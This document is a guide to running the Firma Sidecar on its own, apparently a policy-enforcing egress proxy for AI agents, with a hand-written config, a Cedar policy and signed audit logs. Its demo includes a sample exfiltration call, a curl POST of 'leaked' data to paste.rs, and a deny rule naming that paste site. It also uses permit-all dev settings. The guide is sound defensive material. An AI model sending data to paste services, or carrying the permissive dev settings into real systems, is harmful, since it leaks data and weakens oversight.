---
title: Run the sidecar standalone
description: Start a local Sidecar against a hand-written config and route an agent through it without firma run.
---

This guide walks you through running the Sidecar as a standalone process, pointing an agent at it, and observing decisions in the audit log. It is the next step after the [Quickstart](../../quickstart/) — you'll write your own config from scratch instead of using `just demo`.

By the end you will have:

- A working `firma.toml` you understand line by line.
- A running Sidecar that audits every outbound call to the configured destinations.
- A simple agent (just `curl`) routed through it, producing ALLOW and DENY decisions.

This guide does **not** cover [`firma run`](../firma-run/) (the sandbox wrapper), HTTPS MITM, or capability-mediated workloads. Those build on this baseline.

## Prerequisites

- A built workspace: `cargo build --release` from the repo root.
- `protoc` installed.
- `openssl` for generating the audit signing key.
- `curl` for the test calls.

The release binary lives at `target/release/firma`. If you'd rather use cargo run, substitute `cargo run --release -p firma -- <args>` for `firma <args>` below.

## Step 1: Create a workspace directory

Pick a directory for the Sidecar's runtime files:

```bash
mkdir -p /tmp/firma-standalone/{config,logs}
cd /tmp/firma-standalone
```

This keeps all the dev artifacts in one place so you can blow it away cleanly later.

## Step 2: Generate the audit signing key

The Sidecar signs every audit event with an ECDSA P-256 key. Generate one:

```bash
openssl genpkey \
  -algorithm EC \
  -pkeyopt ec_paramgen_curve:P-256 \
  -out /tmp/firma-standalone/audit.key
```

Keep this file private. It's your tamper-evidence root.

## Step 3: Write the mapping rules

Create `/tmp/firma-standalone/config/mapping-rules.toml`:

```toml
# Map the calls we want to enforce on. Anything not listed here will
# be PASSTHROUGH because we set default_protected = false in the
# sidecar config below — convenient for first-touch experimentation.

[[rules]]
method       = "GET"
host         = "wttr.in"
path         = "*"
action_class = "communication.external.send"

[[rules]]
method       = "POST"
host         = "paste.rs"
path         = "*"
action_class = "communication.external.send"
```

These two rules are enough to demonstrate ALLOW (a weather query) and DENY (a paste exfiltration attempt) without any third-party API keys.

## Step 4: Write a minimal Cedar policy

Create `/tmp/firma-standalone/config/policies/`:

```bash
mkdir -p /tmp/firma-standalone/config/policies
```

Create `/tmp/firma-standalone/config/policies/default.cedar`:

```cedar
// Permit weather lookups; forbid pastes. A minimal demonstration policy.

permit (
    principal,
    action == Firma::Action::"communication.external.send",
    resource
) when {
    context.risk_score < 80
};

forbid (
    principal,
    action == Firma::Action::"communication.external.send",
    resource == Firma::Resource::"paste.rs/"
);
```

The Sidecar evaluates Cedar policies streamed from a running Authority — not
from `[sidecar.policy].dir` alone. That directory is hashed for startup logs;
runtime enforcement comes from the Authority bundle stream. Offline validation
uses the embedded schema via [`firma policy validate`](../test-policies-offline/).

## Step 5: Generate Authority material and write `firma.toml`

Generate the Authority signing key and a permissive issuance policy for this
dev stack:

```bash
firma authority generate-key -o /tmp/firma-standalone/authority.key
mkdir -p /tmp/firma-standalone/config/issuance
cat > /tmp/firma-standalone/config/issuance/issuance.cedar <<'EOF'
permit (principal, action, resource);
EOF
touch /tmp/firma-standalone/revocations.txt
```

Create `/tmp/firma-standalone/config/firma.toml`. Every subcommand reads one
shared, sectioned `firma.toml`:

```toml
[authority]
listen_addr         = "[::1]:50051"
policy_dir          = "/tmp/firma-standalone/config/policies"
issuance_policy_dir = "/tmp/firma-standalone/config/issuance"
revocation_file     = "/tmp/firma-standalone/revocations.txt"
key_file            = "/tmp/firma-standalone/authority.key"
max_ttl = "1h"
bundle_ttl = "30s"

[sidecar.interceptor]
mode               = "http_proxy"
listen_addr        = "127.0.0.1:8080"
drain_timeout_secs = 5

[sidecar.mapping]
rules_path        = "/tmp/firma-standalone/config/mapping-rules.toml"
default_protected = false

[sidecar.policy]
dir = "/tmp/firma-standalone/config/policies"

[sidecar.authority]
url             = "http://[::1]:50051"
public_key_path = "/tmp/firma-standalone/authority.pub"

[sidecar.audit]
sink             = "file"
file_path        = "/tmp/firma-standalone/logs/audit.jsonl"
signing_key_path = "/tmp/firma-standalone/audit.key"
```

Notes:

- **`[sidecar.authority].url` is required** for Stage 2 on mapped routes.
  Without it the Sidecar keeps a deny-all stale evaluator and every protected
  call becomes `policy bundle stale`.
- The Sidecar does not mint a capability at startup. Use `firma run` for
  automatic per-session issuance, or follow
  [Issue capability tokens](../issue-capability-tokens/) to configure a
  long-lived `[sidecar.capability_seed]` before sending protected requests.
- **`default_protected = false`** keeps unmapped destinations as passthrough
  while you experiment. Production stacks should use `true`.
- No `[sidecar.ca]` section — these demo curls use plain HTTP. See
  [Enable HTTPS MITM](../https-mitm/) when you need L7 visibility on TLS.

## Step 6: Start the Authority, then the Sidecar

Two terminals.

**Terminal 1 — Authority:**

```bash
firma authority -c /tmp/firma-standalone/config/firma.toml
```

**Terminal 2 — Sidecar:**

```bash
firma sidecar -c /tmp/firma-standalone/config/firma.toml
```

Expected Sidecar output (lightly trimmed):

```text
INFO config loaded path="/tmp/firma-standalone/config/firma.toml"
INFO mapping table loaded rules=2
INFO policy bundle loaded version="…" policies=1
INFO authority stream connected endpoint="http://[::1]:50051"
INFO connector registry built hosts=0 default_timeout_ms=…
INFO interceptor listening addr="127.0.0.1:8080"
INFO ready
```

The `ready` line is held until the Authority policy and revocation streams
hydrate — so the first proxied request cannot race ahead of enforcement.

## Step 7: Send traffic through it

In a second terminal, route a couple of curl calls through the proxy:

```bash
# Should ALLOW
curl --proxy http://127.0.0.1:8080 http://wttr.in/london?format=3

# Should DENY (HTTP 403 from the Sidecar)
curl --proxy http://127.0.0.1:8080 -X POST http://paste.rs/ -d 'leaked'
```

The first call returns weather text. The second call returns a 403 — the Sidecar refused to dispatch it because the policy forbids `paste.rs/`.

## Step 8: Read the audit log

```bash
tail -n 5 /tmp/firma-standalone/logs/audit.jsonl | python3 -m json.tool
```

You'll see two records (one per curl), each with:

- `decision`: `1` for ALLOW or `2` for DENY.
- `action`: `"communication.external.send"` for both.
- `resource`: the normalized host+path, such as `"wttr.in/london"` or `"paste.rs/"`.
- `deny_reason`: empty for ALLOW; for the forbidden paste, a string like
  `"policy denied: policy denied action 'communication.external.send' on resource 'paste.rs/'"`.
- `signature`: a base64-encoded DER signature that you can verify with the public side of `audit.key`.

For verifying the signature, see [Read & verify the audit log](../audit-log/).

## Common gotchas

**HTTPS calls show up as method `CONNECT`.** Without MITM, the only thing the Sidecar sees about HTTPS is the CONNECT line. The path is `/` and the action class will be whatever your rule maps `CONNECT host:443` to — probably nothing. To enforce on the inner HTTP details, set up MITM ([guide](../https-mitm/)).

**`policy bundle stale` or readiness denies.** These appear when the Sidecar
cannot use a fresh Authority-backed policy bundle or revocation view. You do
not need to sequence the Authority before the Sidecar by hand:
the Sidecar retries Authority streams with backoff, stays fail-closed, and
emits `sidecar ready` only after the required streams hydrate. For
deployment probe guidance, see
[startup ordering and readiness](../deploy-a-genai-webapp/#step-6-configure-startup-ordering-and-readiness).

**`UnclassifiedIntent` for unfamiliar destinations.** With `default_protected = true`, anything you didn't map denies. That's the right shape in production; for development, leave `default_protected = false` until you've enumerated the rules you actually want.

**Permission denied on `audit.key`.** The Sidecar reads it at startup; `chmod 600` is fine. If the key is unreadable, startup fails fast and prints the path it tried.

## What's next

This setup gives you a Sidecar that audits and enforces against destinations you map, using a hand-written Cedar policy. From here:

- [Inspect live sidecars with `firma sidecar status`](../firma-sidecar-status/) — check per-run sidecar health with table or JSON output.
- [Start and monitor the daemon with `firma sidecar` and `firma monitor`](../manage-the-stack/) — supervise Authority + Sidecar as one unit and live-tail decisions, instead of running each binary by hand.
- [Write your first Cedar policy](../write-a-cedar-policy/) — go beyond the two-rule demo and learn the policy patterns.
- [Issue capability tokens](../issue-capability-tokens/) — add an Authority and a real Stage 1 layer.
- [Enable HTTPS MITM](../https-mitm/) — see L7 details for HTTPS hosts.
- [Read & verify the audit log](../audit-log/) — turn the JSONL into a tamper-evident record.
